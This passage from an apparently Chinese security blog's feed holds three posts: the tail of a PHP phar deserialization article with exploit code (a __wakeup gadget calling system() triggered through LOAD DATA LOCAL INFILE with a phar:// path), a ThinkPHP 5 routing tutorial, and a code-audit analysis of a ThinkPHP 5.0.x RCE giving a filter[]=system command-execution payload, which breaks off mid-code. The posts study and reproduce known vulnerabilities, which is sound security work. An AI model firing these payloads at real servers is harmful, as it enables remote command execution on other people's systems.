src="https://gitee.com/m0re/picture/raw/master/img/20210730180436.png" loading="lazy"></p><p>利用方式</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> __wakeup <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">mysqli_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_options</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token constant">MYSQLI_OPT_LOCAL_INFILE</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">mysqli_real_connect</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'test'</span><span class="token punctuation">,</span> <span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'LOAD DATA LOCAL INFILE \'phar://test.phar/flag.txt\' INTO TABLE users  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a><br><a href="https://cbatl.gitee.io/2020/08/11/phar/">https://cbatl.gitee.io/2020/08/11/phar/</a><br><a href="https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/">反序列化攻击面拓展提高篇</a><br><a href="https://www.cnblogs.com/qiujun/p/6861773.html">apache的三种工作模式</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp5.x框架学习</title>
      <link href="/posts/9e44b07a/"/>
      <url>/posts/9e44b07a/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/412E7031-B808-4D04-84D0-6DDACF0F045F.png" loading="lazy"></p><p>没有比思考更复杂的享受了，因此我们乐此不疲</p><a id="more"></a><h1 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h1><p>TP的框架很多操作都是通过URL来实现的：</p><p><a href="http://hostname/index.php/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/%E5%80%BC">http://hostname/index.php/模块/控制器/操作/值</a>….;</p><p>模块在application目录下默认有一个index目录，就是一个模块</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/30/90444_image-20210830000053261.png" alt="image-20210830000053261" loading="lazy"></p><p>这是一个<code>controller</code>模块</p><p>而<code>Index.php</code>控制器的类名也必须是<code>class Index</code>， 否则错误</p><p>操作就是控制器<code>class Index</code>里面的方法，比如：<code>index</code>或者<code>hello</code></p><p>在最基础的控制器中只有一个方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'&lt;style type="text/css">*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style>&lt;div style="padding: 24px 48px;"> &lt;h1>:)&lt;/h1>&lt;p> ThinkPHP V5&lt;br/>&lt;span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架&lt;/span>&lt;/p>&lt;span style="font-size:22px;">[ V5.0 版本由 &lt;a href="http://www.qiniu.com" target="qiniu">七牛云&lt;/a> 独家赞助发布 ]&lt;/span>&lt;/div>&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8">&lt;/script>&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js">&lt;/script>&lt;think id="ad_bd568ce7058a1091">&lt;/think>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>就是首页。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/30/84789_image-20210830000637662.png" alt="image-20210830000637662" loading="lazy"></p><p>在该文件中添加一个hello方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'&lt;style type="text/css">*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style>&lt;div style="padding: 24px 48px;"> &lt;h1>:)&lt;/h1>&lt;p> ThinkPHP V5&lt;br/>&lt;span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架&lt;/span>&lt;/p>&lt;span style="font-size:22px;">[ V5.0 版本由 &lt;a href="http://www.qiniu.com" target="qiniu">七牛云&lt;/a> 独家赞助发布 ]&lt;/span>&lt;/div>&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8">&lt;/script>&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js">&lt;/script>&lt;think id="ad_bd568ce7058a1091">&lt;/think>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ThinkPHP5'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'hello, '</span> <span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>进行访问<code>/idnex.php/index/index/hello</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/30/17460_image-20210830001404907.png" alt="image-20210830001404907" loading="lazy"></p><p>传参：<code>/index.php/index/index/hello/name/m0re</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/30/34620_image-20210830001455572.png" alt="image-20210830001455572" loading="lazy"></p><p>创建test目录，来进行进一步解析。<code>application/test/controller/Abc.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//注意编码UTF-8</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>test<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Abc</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token variable">$who</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'隔壁老王'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$who</span><span class="token punctuation">.</span> <span class="token single-quoted-string string">'吃饭！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>url解析——&gt;<a href="http://127.0.0.1/index.php/test/Abc/eat">http://127.0.0.1/index.php/test/Abc/eat</a></p><p>返回==隔壁老王吃饭==</p><p>解析——&gt;<a href="http://127.0.0.1/index.php/test/Abc/eat/who/m0re">http://127.0.0.1/index.php/test/Abc/eat/who/m0re</a></p><p>返回==m0re吃饭==</p><p>前提：环境开启url伪静态，如果没有开启，则ThinkPHP不支持url重写</p><p>如果没有开启url伪静态，则需使用PATH_INFO模式如下</p><pre class="language-bash" data-language="bash"><code class="language-bash">index.php?s<span class="token operator">=</span>test/Abc/eat/who/m0re</code></pre><p>打开apache2的配置文件， 加载<code>mod_rewrite.so</code>去掉前面的<code>#</code>即可开启。</p><h1 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h1><h2 id="默认模块"><a href="#默认模块" class="headerlink" title="默认模块"></a>默认模块</h2><p>在<code>config.php</code>中有一些默认模块，事提前设置好的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 默认模块名</span>   <span class="token single-quoted-string string">'default_module'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'index'</span><span class="token punctuation">,</span>   <span class="token comment">// 禁止访问模块</span>   <span class="token single-quoted-string string">'deny_module_list'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'common'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   <span class="token comment">// 默认控制器名</span>   <span class="token single-quoted-string string">'default_controller'</span>     <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'Index'</span><span class="token punctuation">,</span>   <span class="token comment">// 默认操作名</span>   <span class="token single-quoted-string string">'default_action'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'index'</span><span class="token punctuation">,</span>    <span class="token comment">// 默认验证器</span>   <span class="token single-quoted-string string">'default_validate'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span>   <span class="token comment">// 默认的空控制器名</span>   <span class="token single-quoted-string string">'empty_controller'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'Error'</span><span class="token punctuation">,</span>   <span class="token comment">// 操作方法后缀</span>   <span class="token single-quoted-string string">'action_suffix'</span>          <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span>   <span class="token comment">// 自动搜索控制器</span>   <span class="token single-quoted-string string">'controller_auto_search'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean constant">false</span><span class="token punctuation">,</span></code></pre><p>所以在访问<code>index.php</code>时，无需输入index.php即可访问到主页，是因为这个默认模块的存在。</p><h2 id="单一模块"><a href="#单一模块" class="headerlink" title="单一模块"></a>单一模块</h2><p>首先在<code>config.php</code>中先将多模块关闭，也就是设置<code>&#39;app_multi_module&#39;       =&gt; false,</code></p><p>然后就可以值设置一个目录<code>controller/</code></p><p>在其下方编写首页代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token comment">//注意这里也是需要修改，原namespace app\index\controller;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'单一模块！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p><code>Env</code>库中获取环境变量。<code>Env::get(&#39;app_path&#39;)</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/31/65299_image-20210831004909216.png" alt="image-20210831004909216" loading="lazy"></p><h1 id="控制器定义"><a href="#控制器定义" class="headerlink" title="控制器定义"></a>控制器定义</h1><p>控制器，即controller，控制器文件存放在controller目录下</p><p>类名和文件名大小写保持一致，并采用驼峰式(首字母大写)</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">;</span></code></pre><p>继承控制器基类。可以更方便使用功能，但不是必须的</p><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><p>路由的作用就是让url地址更加的规范和优雅，或者说更加简洁</p><p>==路由默认开启，没有配置开关，不需要手动配置==</p><pre class="language-php" data-language="php"><code class="language-php">\<span class="token package">think<span class="token punctuation">\</span>Route</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'details/:id'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Address/details'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>替换作用，使用前者<code>details/:id</code>替换掉后面的<code>Address/details</code></p><p>get方法使用最多，一般是<code>Route::get()</code>，默认是GET。其他方式如下：</p><pre class="language-php" data-language="php"><code class="language-php">Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">rule</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'details/:id'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Address/xxxx'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">rule</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'details/:id'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Address/xxxx'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">rule</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'details/:id'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Address/xxxx'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'GET|POST'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>快捷方式</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">GET</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">POST</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">DELETE</span><span class="token punctuation">(</span>delete<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PUT</span><span class="token punctuation">(</span>put<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PATCH</span><span class="token punctuation">(</span>patch<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>any<span class="token punctuation">,</span> 任意请求方式<span class="token punctuation">)</span></code></pre><p>直接使用<code>Route::get()、Route::post()</code>方式时无需第三参数</p><p>就到这里，看的我困。</p><hr><p>继续肝😪😪😪😪</p><h2 id="路由的变量规则"><a href="#路由的变量规则" class="headerlink" title="路由的变量规则"></a>路由的变量规则</h2><p>将details方法里面的id传值，严格的进行限制，必须是数字，因为路由没有设置的话，它可以支持数字，字母，下划线等，不支持特殊符号和中文。</p><pre class="language-php" data-language="php"><code class="language-php">Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'details/:id'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Address/details'</span><span class="token punctuation">)</span>        <span class="token operator">-</span><span class="token operator">></span><span class="token function">pattern</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\d+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置search方法的两个值规则，通过数组的方式传递参数</p><pre class="language-php" data-language="php"><code class="language-php">Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'search/:id/:uid'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'address/search'</span><span class="token punctuation">)</span>        <span class="token operator">-</span><span class="token operator">></span><span class="token function">pattern</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token single-quoted-string string">'id'</span>    <span class="token operator">=</span><span class="token operator">></span>  <span class="token single-quoted-string string">'\d+'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'uid'</span>   <span class="token operator">=</span><span class="token operator">></span>  <span class="token single-quoted-string string">'\d+'</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>上面两种均为局部变量规则，也可以直接在<code>Route.php</code>设置全局变量规则</p><pre class="language-php" data-language="php"><code class="language-php">Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">pattern</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token single-quoted-string string">'id'</span>    <span class="token operator">=</span><span class="token operator">></span>  <span class="token single-quoted-string string">'\d+'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'uid'</span>   <span class="token operator">=</span><span class="token operator">></span>  <span class="token single-quoted-string string">'\d+'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>而后上面两种方式中也不需要<code>-&gt;pattern(&#39;xx&#39;, &#39;xxx&#39;)</code>等操作了。</p><p>支持组合变量规则方式实现路由规则</p><pre class="language-php" data-language="php"><code class="language-php">Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'details-&lt;id>'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Address/details'</span><span class="token punctuation">)</span>        <span class="token operator">-</span><span class="token operator">></span><span class="token function">pattern</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\d+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>:id</code>=&gt;<code>&lt;id&gt;</code>，可以实现更改url访问路径</p><p><a href="http://localhost/public/address/details-10.html">http://localhost/public/address/details-10.html</a>    有时候也使用<code>_&lt;id&gt;</code></p><p>在不设定任何规则的情况下，系统默认<code>\w+</code>在配置文件中可以更改默认规则</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token single-quoted-string string">'default_route_pattern'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'[\w\-]+'</span><span class="token punctuation">,</span></code></pre><h2 id="闭包支持"><a href="#闭包支持" class="headerlink" title="闭包支持"></a>闭包支持</h2><p>闭包支持我们可以通过url直接执行。而不需要通过控制器和方法，并且可以传递参数和动态规则。</p><pre class="language-php" data-language="php"><code class="language-php">Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'think'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token single-quoted-string string">'hello,world!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hello/:name'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token single-quoted-string string">'hello, '</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】ThinkPHP5.x版本RCE漏洞分析与收集</title>
      <link href="/posts/86389a60/"/>
      <url>/posts/86389a60/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/28223_cute2333sdasda.jpg" alt="cute2333sdasda" loading="lazy"></p><p>我要留下我的脚印，让你知道这个夏天我路过你的世界，只是悄悄的留下。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始学习thinkphp框架，就从这里开始吧。学习下thinkphp5的一些rce漏洞，进行审计。</p><p>跟着大佬的博客进行学习复现！本此环境使用的是5.0.22版本的thinkphp</p><h1 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h1><h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload_1"></a>Payload_1</h2><p>先看payload是什么样子的</p><pre class="language-php" data-language="php"><code class="language-php">getindex<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>captchapost_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoami</code></pre><p>入口点是<code>App.php</code>文件，该文件是在<code>\thinkphp\thinkphp\library\think</code>目录下</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/38489_image-20210826005323710.png" alt="image-20210826005323710" loading="lazy"></p><p>由此可以看出此处进行实例化了一个对象<code>$request</code>传给了<code>routeCheck</code>，在本文件中进行跟进</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/57068_image-20210826005916541.png" alt="image-20210826005916541" loading="lazy"></p><p>跟进Route中的check方法也就是<code>Route::check</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/73792_image-20210826010358797.png" alt="image-20210826010358797" loading="lazy"></p><p><code>$method</code>获取值是从<code>request-&gt;$method()</code>中获取的，然后<code>$rules</code>会根据不同的<code>$method</code>值来获取不同的路由规则。</p><p>由上可知跟进到了<code>request.php</code>中的<code>method</code>方法</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/88834_image-20210826011626686.png" alt="image-20210826011626686" loading="lazy"></p><p>主要代码部分</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>Config<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'var_method'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>Config<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'var_method'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload中请求的路由是<code>captcha</code>，它的位置是<code>/vendor/topthink/think-captcha/src/helper.php</code>，根据它的注册规则。可以看到这里是传入get请求。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/54547_image-20210826135849315.png" alt="image-20210826135849315" loading="lazy"></p><p>在最后退出<code>method</code>方法后，<code>return $this-&gt;method=&quot;get&quot;</code>才不会报错，印证了payload中的<code>method=get</code></p><p>又因为在配置文件<code>config.php</code>中设置了默认配置为</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/44411_image-20210826012216704.png" alt="image-20210826012216704" loading="lazy"></p><p>所以才会存在只要post一个<code>_method</code>参数即可进行判断，然后即可执行类的任意函数</p><p>看下request类的<code>__construct()</code>方法，</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/21889_image-20210826013212190.png" alt="image-20210826013212190" loading="lazy"></p><p><code>property_exists</code>检查对象或类是否具有该属性。大概意思为：在<code>$options</code>中遍历<code>name</code>和<code>item</code>。如果存在该<code>name</code>则重新赋值<code>$name=$item</code>导致变量覆盖。且这里<code>$options</code>是用户可以控制输入的。所以这里相当于可以执行危险函数。</p><p>检测路由后会继续进行，应当进入<code>exec</code>方法了，也就是<code>self::exec</code>，进入其中的<code>method</code>分支</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/41358_image-20210826140606828.png" alt="image-20210826140606828" loading="lazy"></p><p>发现回调，继续跟进<code>Request::instance()-&gt;param()</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/63363_image-20210826140804741.png" alt="image-20210826140804741" loading="lazy"></p><p>实例化了一个<code>static</code>对象，继续跟进<code>param</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/08/26/74945_image-20210826140955710.png" alt="image-20210826140955710" loading="lazy"></p><p><code>array_merge()</code>方法，将两个数组合并为一个数组，这里是将传入的<code>param</code>参数与<code>url</code>中<code>get</code>方式提交的参数合并成一个数组。</p><p><code>param()</code>方法最后返回</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>再跟进<code>$this-&gt;input()</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean constant">false</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 获取原始数据</span>            <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">''</span> <span class="token operator">!=</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 解析name</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token 